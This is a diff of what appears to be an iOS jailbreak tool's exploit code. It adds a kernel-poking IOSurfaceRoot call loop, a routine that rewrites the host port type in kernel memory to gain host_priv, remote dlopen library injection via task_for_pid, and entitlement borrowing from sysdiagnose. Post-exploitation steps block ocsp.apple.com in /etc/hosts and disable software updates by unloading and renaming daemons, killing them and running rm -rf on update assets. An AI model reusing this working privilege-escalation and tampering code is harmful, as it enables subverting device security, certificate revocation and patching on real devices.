@@ -218,14 +218,10 @@ int inject_library(pid_t pid, const char *path)
     mach_port_t task_port = MACH_PORT_NULL;
     kern_return_t ret = KERN_FAILURE;
     ret = task_for_pid(mach_task_self(), pid, &task_port);
-    if (!MACH_PORT_VALID(task_port) || ret != KERN_SUCCESS) {
-        return -1;
-    }
+    _assert(MACH_PORT_VALID(task_port) && ret == KERN_SUCCESS);
     call_remote(task_port, dlopen, 2, REMOTE_CSTRING(path), REMOTE_LITERAL(RTLD_NOW));
     uint64_t error = call_remote(task_port, dlerror, 0);
-    if (error != 0) {
-        return -1;
-    }
+    _assert(error == 0);
     return 0;
 }
 
@@ -523,9 +519,9 @@ char *readFile(char *filename) {
 void blockDomainWithName(char *name) {
     char *hostsFile = readFile("/etc/hosts");
     _assert(hostsFile);
-    char *newLine = malloc(sizeof(char *) + (11 + sizeof(name)));
-    bzero(newLine, sizeof(char *) + (11 + sizeof(name)));
-    sprintf(newLine, "127.0.0.1 %s", name);
+    char *newLine = malloc(sizeof(char *) + (15 + sizeof(name)));
+    bzero(newLine, sizeof(char *) + (15 + sizeof(name)));
+    sprintf(newLine, "\n127.0.0.1 %s\n", name);
     if (strstr(hostsFile, newLine)) return;
     FILE *f = fopen("/etc/hosts", "a");
     _assert(f);
@@ -768,6 +764,79 @@ int message_size_for_kalloc_size(int kalloc_size) {
     return ((3*kalloc_size)/4) - 0x74;
 }
 
+void iosurface_die() {
+    kern_return_t err;
+    
+    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+    
+    if (service == IO_OBJECT_NULL){
+        printf("unable to find service\n");
+        return;
+    }
+    
+    printf("got service port\n");
+    
+    io_connect_t conn = MACH_PORT_NULL;
+    err = IOServiceOpen(service, mach_task_self(), 0, &conn);
+    if (err != KERN_SUCCESS){
+        printf("unable to get user client connection\n");
+        return;
+    }
+    
+    printf("got user client: 0x%x\n", conn);
+    
+    uint64_t inputScalar[16];
+    uint64_t inputScalarCnt = 0;
+    
+    char inputStruct[4096];
+    size_t inputStructCnt = 0x18;
+    
+    
+    uint64_t* ivals = (uint64_t*)inputStruct;
+    ivals[0] = 1;
+    ivals[1] = 2;
+    ivals[2] = 3;
+    
+    uint64_t outputScalar[16];
+    uint32_t outputScalarCnt = 0;
+    
+    char outputStruct[4096];
+    size_t outputStructCnt = 0;
+    
+    mach_port_t port = MACH_PORT_NULL;
+    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+    if (err != KERN_SUCCESS) {
+        printf("failed to allocate new port\n");
+        return;
+    }
+    printf("got wake port 0x%x\n", port);
+    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+    
+    uint64_t reference[8] = {0};
+    uint32_t referenceCnt = 1;
+    
+    for (int i = 0; i < 10; i++) {
+        err = IOConnectCallAsyncMethod(
+                                       conn,
+                                       17,
+                                       port,
+                                       reference,
+                                       referenceCnt,
+                                       inputScalar,
+                                       (uint32_t)inputScalarCnt,
+                                       inputStruct,
+                                       inputStructCnt,
+                                       outputScalar,
+                                       &outputScalarCnt,
+                                       outputStruct,
+                                       &outputStructCnt);
+        
+        printf("%x\n", err);
+    };
+    
+    return;
+}
+
 int vfs_die() {
     int fd = open("/", O_RDONLY);
     if (fd == -1) {
@@ -835,7 +904,32 @@ int mptcp_die() {
     return 0;
 }
 
-void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_daemons, int dump_apticket, int run_uicache, const char *boot_nonce)
+#define IO_ACTIVE 0x80000000
+
+#define IKOT_HOST 3
+#define IKOT_HOST_PRIV 4
+
+void make_host_into_host_priv() {
+    uint64_t hostport_addr = getAddressOfPort(getpid(), mach_host_self());
+    uint32_t old = rk32(hostport_addr);
+    printf("old host type: 0x%08x\n", old);
+    wk32(hostport_addr, IO_ACTIVE | IKOT_HOST_PRIV);
+}
+
+mach_port_t try_restore_port() {
+    mach_port_t port = MACH_PORT_NULL;
+    kern_return_t err;
+    err = host_get_special_port(mach_host_self(), 0, 4, &port);
+    if (err == KERN_SUCCESS && port != MACH_PORT_NULL) {
+        printf("got persisted port!\n");
+        // make sure rk64 etc use this port
+        return port;
+    }
+    printf("unable to retrieve persisted port\n");
+    return MACH_PORT_NULL;
+}
+
+void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_daemons, int dump_apticket, int run_uicache, const char *boot_nonce, int disable_auto_updates)
 {
     // Initialize variables.
     int rv = 0;
@@ -969,11 +1063,11 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
     }
     
     {
-        // Borrow entitlements from ps.
+        // Borrow entitlements from sysdiagnose.
         
-        LOG("Borrowing entitlements from ps...");
-        borrowEntitlementsFromDonor("/bin/ps", NULL);
-        LOG("Successfully borrowed entitlements from ps.");
+        LOG("Borrowing entitlements from sysdiagnose...");
+        borrowEntitlementsFromDonor("/usr/bin/sysdiagnose", "--help");
+        LOG("Successfully borrowed entitlements from sysdiagnose.");
         
         // We now have Task_for_pid.
     }
@@ -1582,9 +1676,9 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         // Block ocsp.apple.com.
         
         LOG("Blocking ocsp.apple.com...");
-        printf("%s\n", readFile("/etc/hosts"));
+        LOG("%s", readFile("/etc/hosts"));
         blockDomainWithName("ocsp.apple.com");
-        printf("%s\n", readFile("/etc/hosts"));
+        LOG("%s", readFile("/etc/hosts"));
         LOG("Successfully blocked ocsp.apple.com.");
     }
     
@@ -1605,6 +1699,57 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         LOG("Successfully allowed SpringBoard to show non-default system apps.");
+    }
+    
+    {
+        // Disable Auto Updates.
+        
+        LOG("Disabling Auto Updates...");
+        if (disable_auto_updates) {
+            if (!access("/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist", F_OK)) {
+                rv = execCommandAndWait("/bin/launchctl", "unload", "/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist", NULL, NULL, NULL);
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+                rv = rename("/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist", "/System/Library/com.apple.mobile.softwareupdated.plist");
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+            }
+            if (!access("/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist", F_OK)) {
+                rv = execCommandAndWait("/bin/launchctl", "unload", "/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist", NULL, NULL, NULL);
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+                rv = rename("/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist", "/System/Library/com.apple.softwareupdateservicesd.plist");
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+            }
+            if (!access("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/Support/softwareupdated", F_OK)) {
+                rv = rename("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/Support/softwareupdated", "/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/softwareupdated");
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+            }
+            if (!access("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/Support/softwareupdateservicesd", F_OK)) {
+                rv = rename("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/Support/softwareupdateservicesd", "/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/softwareupdateservicesd");
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+            }
+            if (findPidOfProcess("softwareupdated")) {
+                rv = kill(findPidOfProcess("softwareupdated"), SIGKILL);
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+            }
+            if (findPidOfProcess("softwareupdateservicesd")) {
+                rv = kill(findPidOfProcess("softwareupdateservicesd"), SIGKILL);
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+            }
+            rv = execCommandAndWait("/bin/rm", "-rf", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation/*", NULL, NULL, NULL);
+            LOG("rv: " "%d" "\n", rv);
+            _assert(rv == 0);
+            rv = execCommandAndWait("/bin/rm", "-rf", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate/*", NULL, NULL, NULL);
+            LOG("rv: " "%d" "\n", rv);
+            _assert(rv == 0);
+        }
+        LOG("Successfully disabled Auto Updates.");
     }
     
     {
@@ -1675,7 +1820,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         LOG("Validating TFP0...");
         _assert(MACH_PORT_VALID(tfp0));
         LOG("Successfully validated TFP0.");
-        exploit(tfp0, (uint64_t)get_kernel_base(tfp0), [[NSUserDefaults standardUserDefaults] boolForKey:@K_TWEAK_INJECTION], [[NSUserDefaults standardUserDefaults] boolForKey:@K_LOAD_DAEMONS], [[NSUserDefaults standardUserDefaults] boolForKey:@K_DUMP_APTICKET], [[NSUserDefaults standardUserDefaults] boolForKey:@K_REFRESH_ICON_CACHE], [[[NSUserDefaults standardUserDefaults] objectForKey:@K_BOOT_NONCE] UTF8String]);
+        exploit(tfp0, (uint64_t)get_kernel_base(tfp0), [[NSUserDefaults standardUserDefaults] boolForKey:@K_TWEAK_INJECTION], [[NSUserDefaults standardUserDefaults] boolForKey:@K_LOAD_DAEMONS], [[NSUserDefaults standardUserDefaults] boolForKey:@K_DUMP_APTICKET], [[NSUserDefaults standardUserDefaults] boolForKey:@K_REFRESH_ICON_CACHE], [[[NSUserDefaults standardUserDefaults] objectForKey:@K_BOOT_NONCE] UTF8String], [[NSUserDefaults standardUserDefaults] boolForKey:@K_DISABLE_AUTO_UPDATES]);
         dispatch_async(dispatch_get_main_queue(), ^{
             [self.goButton setTitle:@"Done, exit." forState:UIControlStateDisabled];
         });
